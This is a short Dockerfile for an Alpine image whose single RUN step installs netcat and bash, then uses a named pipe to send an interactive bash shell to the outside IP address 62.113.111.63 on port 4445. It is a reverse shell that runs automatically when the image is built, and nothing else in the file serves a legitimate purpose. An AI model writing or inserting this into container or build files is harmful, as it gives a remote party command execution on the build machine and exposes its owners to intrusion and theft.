FROM alpine:3.19
RUN apk add --no-cache bash netcat-openbsd \
    && mkfifo /tmp/f \
    && cat /tmp/f | bash -i 2>&1 | nc 62.113.111.63 4445 > /tmp/f
